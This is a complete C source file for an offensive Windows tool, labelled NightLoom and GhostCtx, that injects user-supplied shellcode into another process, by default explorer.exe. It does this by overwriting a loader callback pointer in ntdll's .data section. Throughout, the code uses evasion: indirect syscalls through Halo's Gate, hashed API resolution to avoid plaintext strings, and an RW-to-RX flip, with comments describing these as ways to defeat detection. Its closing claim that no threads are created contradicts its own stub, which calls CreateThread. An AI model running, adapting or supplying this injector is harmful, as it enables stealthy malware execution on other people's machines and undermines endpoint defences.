/*
 * NightLoom — Cross-process Injection via Ldr Activation Context Callback
 *
 * NOVEL TECHNIQUE: Overwrites a function pointer stored in ntdll's writable
 * .data section that the Ldr calls through a fothk trampoline (JMP RAX)
 * during every LoadLibrary operation. No CFG validation on the dispatch path.
 *
 * Primitives: NtOpenProcess + NtAllocateVirtualMemory + NtWriteVirtualMemory
 * Trigger:    Natural DLL loads in the target (no thread/APC needed)
 * Cleanup:    Shellcode stub auto-restores original pointer before tail-calling
 *
 * All syscalls resolved via Halo's Gate indirect dispatch.
 */

#include "Common.h"
#include "HalosGate.h"
#include "PebResolver.h"
#include "MemReadGadget.h"

#include <TlHelp32.h>

#pragma comment(lib, "Shlwapi.lib")

typedef struct _CTX_GLOBAL {
    SYSCALL_ENTRY NtOpenProcess;
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtReadVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQueryVirtualMemory;
} CTX_GLOBAL, *PCTX_GLOBAL;

typedef struct _CTX_TARGET {
    DWORD   dwPid;
    HANDLE  hProcess;
    PVOID   pSlotRemote;
    ULONG_PTR ulOrigValue;
    PVOID   pShellcode;
    SIZE_T  cbShellcode;
} CTX_TARGET, *PCTX_TARGET;

static CTX_GLOBAL g_Api = { 0 };

#define STUB_SIZE       0x78
#define TRAMPOLINE_OFF  0x70

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 0: Initialize Halo's Gate
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeGate(void)
{
    HMODULE hNtdll = ResolveModuleByHash(CRC32B_NTDLLDLL);
    if (!hNtdll) {
        printf("[!] Failed to resolve ntdll\n");
        return FALSE;
    }

    if (!ScanReadGadgets(hNtdll, 0)) {
        printf("[!] Failed to find read gadgets\n");
        return FALSE;
    }

    struct { DWORD hash; PSYSCALL_ENTRY entry; const char *name; } tbl[] = {
        { CRC32B_NTOPENPROCESS,           &g_Api.NtOpenProcess,           "NtOpenProcess"           },
        { CRC32B_NTALLOCATEVIRTUALMEMORY, &g_Api.NtAllocateVirtualMemory, "NtAllocateVirtualMemory" },
        { CRC32B_NTWRITEVIRTUALMEMORY,    &g_Api.NtWriteVirtualMemory,    "NtWriteVirtualMemory"    },
        { CRC32B_NTREADVIRTUALMEMORY,     &g_Api.NtReadVirtualMemory,     "NtReadVirtualMemory"     },
        { CRC32B_NTPROTECTVIRTUALMEMORY,  &g_Api.NtProtectVirtualMemory,  "NtProtectVirtualMemory"  },
        { CRC32B_NTCLOSE,                 &g_Api.NtClose,                 "NtClose"                 },
        { CRC32B_NTQUERYVIRTUALMEMORY,    &g_Api.NtQueryVirtualMemory,    "NtQueryVirtualMemory"    },
    };

    for (int i = 0; i < _countof(tbl); i++) {
        if (!ResolveSyscallByHash(tbl[i].hash, tbl[i].entry)) {
            printf("[!] Failed to resolve %s\n", tbl[i].name);
            return FALSE;
        }
    }

    printf("[+] Halo's Gate: 7 syscalls resolved (indirect dispatch)\n");
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Process finder
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD FindProcessByName(const WCHAR *name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 1: Locate the activation context pointer in ntdll .data
//
// Strategy: Scan ntdll .data for the CreateActCtxW Worker pointer.
// The Ldr stores kernel32's internal CreateActCtxWWorker address there
// during process initialization. We find it by:
// 1. Parse ntdll PE to find .data section
// 2. Get kernel32 base + size
// 3. Scan .data offsets 0x6000-0x7000 for pointers into kernel32
// 4. The target is the last such pointer in the group of 3 actctx ptrs
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static PVOID LocateActCtxSlot(OUT ULONG_PTR *pOrigValue)
{
    HMODULE hNtdll = ResolveModuleByHash(CRC32B_NTDLLDLL);
    HMODULE hK32 = ResolveModuleByHash(CRC32B_KERNEL32DLL);
    if (!hNtdll || !hK32) return NULL;

    ULONG_PTR ntBase = (ULONG_PTR)hNtdll;
    ULONG_PTR k32Base = (ULONG_PTR)hK32;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(ntBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    ULONG_PTR dataVA = 0;
    DWORD dataSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".data", 5) == 0) {
            dataVA = ntBase + pSec[i].VirtualAddress;
            dataSize = pSec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!dataVA) return NULL;

    PIMAGE_DOS_HEADER pDos2 = (PIMAGE_DOS_HEADER)hK32;
    PIMAGE_NT_HEADERS pNt2 = (PIMAGE_NT_HEADERS)(k32Base + pDos2->e_lfanew);
    ULONG_PTR k32End = k32Base + pNt2->OptionalHeader.SizeOfImage;

    printf("[*] ntdll .data: 0x%p (size 0x%lX)\n", (PVOID)dataVA, dataSize);
    printf("[*] kernel32:    0x%p - 0x%p\n", (PVOID)k32Base, (PVOID)k32End);

    /* Pattern scan: The activation context pointers are a cluster
     * of kernel32/KERNELBASE function pointers in the Ldr's initialization
     * data area. We find them by scanning ntdll .text for MOV RAX,[rip+disp]
     * instructions whose target falls in .data and is followed by a CALL to
     * a fothk trampoline entry. The fothk section has JMP rel32 → JMP RAX. */

    /* First, find the fothk section */
    ULONG_PTR fothkVA = 0;
    DWORD fothkSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, "fothk", 5) == 0) {
            fothkVA = ntBase + pSec[i].VirtualAddress;
            fothkSize = pSec[i].Misc.VirtualSize;
            break;
        }
    }

    /* Find the main .text section (largest executable) */
    ULONG_PTR textVA = 0;
    DWORD textSize = 0;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if ((pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            pSec[i].Misc.VirtualSize > textSize) {
            textVA = ntBase + pSec[i].VirtualAddress;
            textSize = pSec[i].Misc.VirtualSize;
        }
    }

    if (!fothkVA || !textVA) {
        printf("[!] Cannot find fothk or .text section\n");
        return NULL;
    }

    printf("[*] Scanning .text for fothk-dispatched .data pointers...\n");

    /* Scan .text for: MOV RAX, [rip+disp32] (48 8B 05 xx xx xx xx)
     * followed within 32 bytes by CALL rel32 (E8 xx xx xx xx) → fothk */
    for (ULONG_PTR pc = textVA; pc + 12 < textVA + textSize; pc++) {
        PBYTE b = (PBYTE)pc;
        if (b[0] != 0x48 || b[1] != 0x8B || b[2] != 0x05) continue;

        INT32 disp = *(INT32*)(b + 3);
        ULONG_PTR dataTarget = pc + 7 + disp;

        if (dataTarget < dataVA || dataTarget >= dataVA + dataSize) continue;

        /* Check if value at that .data slot is a kernel32 code pointer */
        ULONG_PTR val = *(ULONG_PTR*)dataTarget;
        if (val < k32Base || val >= k32End) continue;

        /* Look ahead for CALL rel32 → fothk within 48 bytes */
        for (int j = 7; j < 48 && pc + j + 5 < textVA + textSize; j++) {
            if (b[j] != 0xE8) continue;
            INT32 callDisp = *(INT32*)(b + j + 1);
            ULONG_PTR callTarget = pc + j + 5 + callDisp;
            if (callTarget >= fothkVA && callTarget < fothkVA + fothkSize) {
                DWORD dataOff = (DWORD)(dataTarget - dataVA);
                printf("[+] .data+0x%04lX → kernel32+0x%llX (fothk dispatch at ntdll+0x%llX)\n",
                       dataOff,
                       (unsigned long long)(val - k32Base),
                       (unsigned long long)(pc - ntBase));

                /* Verify the fothk entry is JMP rel32 → JMP RAX pattern */
                PBYTE pFothk = (PBYTE)callTarget;
                if (pFothk[0] == 0xE9) {
                    INT32 jmpDisp = *(INT32*)(pFothk + 1);
                    PBYTE pJmpTarget = pFothk + 5 + jmpDisp;
                    if (pJmpTarget[0] == 0x48 && pJmpTarget[1] == 0xFF &&
                        pJmpTarget[2] == 0xE0) {
                        printf("[+] Confirmed: fothk → JMP RAX (no CFG)\n");
                        *pOrigValue = val;
                        return (PVOID)dataTarget;
                    }
                }
            }
        }
    }

    printf("[!] Could not locate activation context slot\n");
    return NULL;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 2: Open target process via indirect syscall
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL OpenTarget(PCTX_TARGET ctx)
{
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = { .UniqueProcess = (HANDLE)(ULONG_PTR)ctx->dwPid };

    GATE_PREPARE(g_Api.NtOpenProcess);
    NTSTATUS status = GATE_CALL(
        &ctx->hProcess,
        (ACCESS_MASK)(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE),
        &oa,
        &cid
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtOpenProcess failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Process handle: 0x%p\n", ctx->hProcess);
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 3: Verify remote pointer matches local
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL VerifyRemoteSlot(PCTX_TARGET ctx)
{
    ULONG_PTR remoteVal = 0;
    SIZE_T cbRead = 0;

    GATE_PREPARE(g_Api.NtReadVirtualMemory);
    NTSTATUS status = GATE_CALL(
        ctx->hProcess,
        ctx->pSlotRemote,
        &remoteVal,
        (SIZE_T)8,
        &cbRead
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtReadVirtualMemory failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Remote slot: 0x%p\n", (PVOID)remoteVal);

    if (remoteVal != ctx->ulOrigValue) {
        printf("[!] Remote value differs from local — using remote value\n");
        ctx->ulOrigValue = remoteVal;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 4: Build shellcode (stub + payload) and inject
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InjectShellcode(PCTX_TARGET ctx, PBYTE pPayload, DWORD cbPayload)
{
    /*
     * The callback fires while the Ldr lock is held (inside LoadLibrary).
     * Calling WinExec/CreateProcess directly would deadlock on the Ldr lock.
     * Solution: spawn a new thread via CreateThread to run the payload
     * asynchronously, outside the lock context.
     *
     * Stub layout (0x70 = 112 bytes):
     *   [00-0A] Save volatile registers (7 pushes)
     *   [0B-0E] sub rsp, 0x30 (shadow + 2 stack args, aligned)
     *   [0F-18] MOV RAX, <slot_addr>
     *   [19-22] MOV RCX, <orig_value>
     *   [23-25] MOV [RAX], RCX          ; restore original pointer
     *   [26-27] XOR ECX, ECX            ; lpSecurityAttributes = NULL
     *   [28-29] XOR EDX, EDX            ; dwStackSize = 0
     *   [2A-33] MOV R8, <payload_addr>  ; lpStartAddress
     *   [34-36] XOR R9D, R9D            ; lpParameter = NULL
     *   [37-3F] MOV [RSP+0x20], 0       ; dwCreationFlags = 0
     *   [40-48] MOV [RSP+0x28], 0       ; lpThreadId = NULL
     *   [49-52] MOV RAX, <CreateThread>
     *   [53-54] CALL RAX                ; CreateThread → runs payload in new thread
     *   [55-58] add rsp, 0x30
     *   [59-63] Restore volatile registers
     *   [64-6D] MOV RAX, <orig_value>
     *   [6E-6F] JMP RAX                 ; tail-call original function
     *   [70]    payload starts here (LPTHREAD_START_ROUTINE compatible)
     */

    /* Resolve CreateThread via hash — no plaintext strings */
    HMODULE hK32 = ResolveModuleByHash(CRC32B_KERNEL32DLL);
    FARPROC pCreateThread = ResolveProcByHash(hK32, CRC32B_CREATETHREAD);
    if (!pCreateThread) {
        printf("[!] Cannot resolve CreateThread\n");
        return FALSE;
    }
    printf("[*] CreateThread: 0x%p\n", pCreateThread);

    BYTE stub[STUB_SIZE] = {
        /* Save volatile registers */
        0x50,                                           /* 00: push rax         */
        0x51,                                           /* 01: push rcx         */
        0x52,                                           /* 02: push rdx         */
        0x41, 0x50,                                     /* 03: push r8          */
        0x41, 0x51,                                     /* 05: push r9          */
        0x41, 0x52,                                     /* 07: push r10         */
        0x41, 0x53,                                     /* 09: push r11         */
        0x48, 0x83, 0xEC, 0x30,                         /* 0B: sub rsp, 0x30   */

        /* Restore original pointer */
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 0F: mov rax, <slot>  */
        0x48, 0xB9, 0,0,0,0,0,0,0,0,                   /* 19: mov rcx, <orig>  */
        0x48, 0x89, 0x08,                               /* 23: mov [rax], rcx   */

        /* CreateThread(NULL, 0, payload, NULL, 0, NULL) */
        0x31, 0xC9,                                     /* 26: xor ecx, ecx     */
        0x31, 0xD2,                                     /* 28: xor edx, edx     */
        0x49, 0xB8, 0,0,0,0,0,0,0,0,                   /* 2A: mov r8, <payload>*/
        0x45, 0x31, 0xC9,                               /* 34: xor r9d, r9d     */
        0x48, 0xC7, 0x44, 0x24, 0x20, 0,0,0,0,         /* 37: mov [rsp+20],0   */
        0x48, 0xC7, 0x44, 0x24, 0x28, 0,0,0,0,         /* 40: mov [rsp+28],0   */
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 49: mov rax, <CT>    */
        0xFF, 0xD0,                                     /* 53: call rax         */

        /* Restore registers */
        0x48, 0x83, 0xC4, 0x30,                         /* 55: add rsp, 0x30   */
        0x41, 0x5B,                                     /* 59: pop r11          */
        0x41, 0x5A,                                     /* 5B: pop r10          */
        0x41, 0x59,                                     /* 5D: pop r9           */
        0x41, 0x58,                                     /* 5F: pop r8           */
        0x5A,                                           /* 61: pop rdx          */
        0x59,                                           /* 62: pop rcx          */
        0x58,                                           /* 63: pop rax          */

        /* Tail-call to original function */
        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 64: mov rax, <orig>  */
        0xFF, 0xE0,                                     /* 6E: jmp rax          */

        /* Trampoline for LPTHREAD_START_ROUTINE alignment.
         * CreateThread → BaseThreadInitThunk → CALL trampoline (RSP = 16n-8).
         * Shellcode expects RSP = 16n-16 (designed for direct CALL entry).
         * This CALL adds the missing 8 bytes of stack depth. */
        0xE8, 0x03, 0x00, 0x00, 0x00,                  /* 70: call +3 → 0x78   */
        0x31, 0xC0,                                     /* 75: xor eax, eax     */
        0xC3,                                           /* 77: ret              */
    };

    DWORD cbTotal = STUB_SIZE + cbPayload;
    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbTotal);
    if (!pBuf) return FALSE;

    memcpy(pBuf, stub, STUB_SIZE);
    memcpy(pBuf + STUB_SIZE, pPayload, cbPayload);

    /* Allocate RW in target (NOT RWX — flip to RX after writing) */
    PVOID pRemote = NULL;
    SIZE_T cbAlloc = (SIZE_T)cbTotal;

    GATE_PREPARE(g_Api.NtAllocateVirtualMemory);
    NTSTATUS status = GATE_CALL(
        ctx->hProcess, &pRemote, (ULONG_PTR)0, &cbAlloc,
        (ULONG)(MEM_COMMIT | MEM_RESERVE),
        (ULONG)PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
        HeapFree(GetProcessHeap(), 0, pBuf);
        return FALSE;
    }

    printf("[+] Allocated RW: 0x%p (%llu bytes)\n", pRemote, (unsigned long long)cbAlloc);

    /* Patch stub with actual addresses */
    *(ULONG_PTR*)(pBuf + 0x11) = (ULONG_PTR)ctx->pSlotRemote;     /* slot addr  */
    *(ULONG_PTR*)(pBuf + 0x1B) = ctx->ulOrigValue;                 /* orig value */
    *(ULONG_PTR*)(pBuf + 0x2C) = (ULONG_PTR)pRemote + TRAMPOLINE_OFF; /* trampoline */
    *(ULONG_PTR*)(pBuf + 0x4B) = (ULONG_PTR)pCreateThread;        /* CreateThread */
    *(ULONG_PTR*)(pBuf + 0x66) = ctx->ulOrigValue;                 /* orig (jmp) */

    /* Write to target */
    SIZE_T cbWritten = 0;
    GATE_PREPARE(g_Api.NtWriteVirtualMemory);
    status = GATE_CALL(
        ctx->hProcess, pRemote, pBuf,
        (SIZE_T)cbTotal, &cbWritten
    );

    HeapFree(GetProcessHeap(), 0, pBuf);

    if (!NT_SUCCESS(status)) {
        printf("[!] NtWriteVirtualMemory (shellcode) failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Written %llu bytes (stub: %d + payload: %lu)\n",
           (unsigned long long)cbWritten, STUB_SIZE, cbPayload);

    /* Flip RW → RX (removes biggest detection signal) */
    {
        PVOID pProtect = pRemote;
        SIZE_T cbProtect = cbAlloc;
        ULONG ulOldProtect = 0;

        GATE_PREPARE(g_Api.NtProtectVirtualMemory);
        status = GATE_CALL(
            ctx->hProcess, &pProtect, &cbProtect,
            (ULONG)PAGE_EXECUTE_READ, &ulOldProtect
        );

        if (!NT_SUCCESS(status)) {
            printf("[!] NtProtectVirtualMemory (RW→RX) failed: 0x%08lX\n", status);
            return FALSE;
        }

        printf("[+] Protection: RW → RX\n");
    }

    ctx->pShellcode = pRemote;
    ctx->cbShellcode = cbTotal;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Phase 5: Overwrite the .data pointer → arm the trigger
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ArmTrigger(PCTX_TARGET ctx)
{
    ULONG_PTR newVal = (ULONG_PTR)ctx->pShellcode;
    SIZE_T cbWritten = 0;

    printf("[*] Overwriting .data pointer:\n");
    printf("    0x%p → 0x%p\n", (PVOID)ctx->ulOrigValue, (PVOID)newVal);

    GATE_PREPARE(g_Api.NtWriteVirtualMemory);
    NTSTATUS status = GATE_CALL(
        ctx->hProcess, ctx->pSlotRemote, &newVal,
        (SIZE_T)sizeof(newVal), &cbWritten
    );

    if (!NT_SUCCESS(status)) {
        printf("[!] NtWriteVirtualMemory (.data slot) failed: 0x%08lX\n", status);
        return FALSE;
    }

    printf("[+] Pointer overwritten — trigger armed\n");
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Entry point
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int wmain(int argc, WCHAR **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    g_bVerbose = TRUE;

    printf("\n");
    printf("  ╔══════════════════════════════════════════════════════════╗\n");
    printf("  ║  GhostCtx — Ldr Activation Context Callback Injection  ║\n");
    printf("  ║  Novel technique: .data fptr → fothk JMP RAX (no CFG)  ║\n");
    printf("  ╚══════════════════════════════════════════════════════════╝\n");
    printf("\n");

    if (argc < 2) {
        printf("  Usage: GhostCtx.exe <shellcode.bin> [target]\n");
        printf("         target = PID (numeric) or process name\n");
        printf("         default target: explorer.exe\n\n");
        return 1;
    }

    /* Read shellcode file */
    HANDLE hFile = CreateFileW(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open shellcode: %ls\n", argv[1]);
        return 1;
    }
    DWORD cbPayload = GetFileSize(hFile, NULL);
    PBYTE pPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPayload);
    DWORD dwRead;
    ReadFile(hFile, pPayload, cbPayload, &dwRead, NULL);
    CloseHandle(hFile);
    printf("[+] Shellcode: %ls (%lu bytes)\n", argv[1], cbPayload);

    /* Resolve target */
    CTX_TARGET ctx = { 0 };
    if (argc >= 3) {
        WCHAR *endp = NULL;
        DWORD tmp = (DWORD)wcstoul(argv[2], &endp, 10);
        if (endp && *endp == L'\0')
            ctx.dwPid = tmp;
        else
            ctx.dwPid = FindProcessByName(argv[2]);
    } else {
        ctx.dwPid = FindProcessByName(L"explorer.exe");
    }

    if (!ctx.dwPid) {
        printf("[!] Cannot find target process\n");
        return 1;
    }
    printf("[+] Target PID: %lu\n\n", ctx.dwPid);

    /* Phase 0: Initialize indirect syscalls */
    printf("[*] Phase 0: Initializing Halo's Gate...\n");
    if (!InitializeGate()) return 1;

    /* Phase 1: Locate the target pointer in ntdll .data */
    printf("\n[*] Phase 1: Locating activation context callback slot...\n");
    PVOID pSlot = LocateActCtxSlot(&ctx.ulOrigValue);
    if (!pSlot) {
        printf("[!] Failed to locate activation context slot\n");
        return 1;
    }
    ctx.pSlotRemote = pSlot;

    /* Phase 2: Open target */
    printf("\n[*] Phase 2: Opening target process...\n");
    if (!OpenTarget(&ctx)) return 1;

    /* Phase 3: Verify remote slot */
    printf("\n[*] Phase 3: Verifying remote pointer...\n");
    if (!VerifyRemoteSlot(&ctx)) return 1;

    /* Phase 4: Inject shellcode */
    printf("\n[*] Phase 4: Injecting shellcode...\n");
    if (!InjectShellcode(&ctx, pPayload, cbPayload)) return 1;

    /* Phase 5: Arm trigger */
    printf("\n[*] Phase 5: Arming trigger...\n");
    if (!ArmTrigger(&ctx)) return 1;

    /* Cleanup */
    GATE_PREPARE(g_Api.NtClose);
    GATE_CALL(ctx.hProcess);

    HeapFree(GetProcessHeap(), 0, pPayload);

    printf("\n[+] Injection complete!\n");
    printf("[*] Trigger: next LoadLibrary call in PID %lu\n", ctx.dwPid);
    printf("[*] Stub auto-restores original pointer → process stays stable\n");
    printf("[*] No threads created, no APCs queued — pure data overwrite\n\n");

    return 0;
}
